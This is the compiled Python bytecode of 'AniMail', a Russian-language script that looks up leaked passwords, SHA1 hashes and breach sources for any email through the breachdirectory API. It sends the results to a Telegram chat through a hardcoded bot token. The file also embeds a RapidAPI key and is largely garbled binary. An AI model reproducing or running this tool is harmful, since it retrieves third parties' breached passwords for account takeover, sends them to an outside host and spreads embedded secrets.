a
    &|	a�  �                   @   s�  d dl Z d dlZd dlZd dlmZmZ ejej Zejej	 Z
ejej Zejej Zed e d e d e d e d Zdd	� Ze�d
� ee� eed e
 d e d d e d e
 d e d e �Zeed e
 d e d d e d e
 d e d e �ZdZdZdZed e e Zde d d d eed� Ze �de d e d  e � eed e
 d! e d d e d" e
 d# e d! e � e�d$� e�d%� dS )&�    N)�Fore�Styleu�    

╭━━━╮╱╱╱╱╱╱╱╱╱╱╭╮
┃╭━╮┃╱╱╱╱╱╱╱╱╱╱┃┃
┃┃╱┃┣━╮╭┳╮╭┳━━┳┫┃  z    Coded by Kyubeyu9   
┃╰━╯┃╭╮╋┫╰╯┃╭╮┣┫┃     z  @callier_corpup   
┃╭━╮┃┃┃┃┃┃┃┃╭╮┃┃╰╮
╰╯╱╰┻╯╰┻┻┻┻┻╯╰┻┻━╯
 c           
      C   s�   d}d}d| d�}|dd�}t jd|||d�}t�|j�}g }|d	 d
kr�|d }|D ]H}	|	d d
krV|�d|	d  d d |	d  d d t|	d � � qVqVndS d�|�S )Nz'https://breachdirectory.p.rapidapi.com/Z2097530a10fmsh128226e531fd14fp1fa915jsnebf0b8141964�auto)�funcZtermzbreachdirectory.p.rapidapi.com)zx-rapidapi-keyzx-rapidapi-hostZGET)�headers�params�successT�resultZhas_passwordz|Password: �password�
z|SHA1: Zsha1z
|Sources: Zsourcesz
Not found!�

)�requestsZrequest�json�loads�text�append�str�join)
�target�token�urlZquerystringr   ZresponseZleaks�list�results�i� r   �1   /storage/emulated/0/Файлы/Animail/Animail.py�search_pass   s    

8r   �clear�[�?�]� u   Введите вашz ID u   аккаунта: u   Введите zemail u   адрес: Z
1920366011zAAEx7ebDp-OERcCt2laZf5GXJOajHFRpylNg�:u_   AniMail 📲 | Version 1.0
Coded by Anibey | @callier_corp

Электронная почта: r   u)   Найденная информация: r   r   zhttps://api.telegram.org/botz/sendMessage?chat_id=z&text=�!u   Информацияu    отправленаZcdz(clear && cd s29etf93uc0slqh2rmsa8i && ls)r   r   �osZcoloramar   r   ZBRIGHTZWHITE�wZGREEN�gZYELLOW�yZRED�rZbannerr   �system�print�input�idZemailZidbZbot1Zbot2Z	token_botZbanner_send�getr   r   r   r   �<module>   s\   ��������

<<�����<
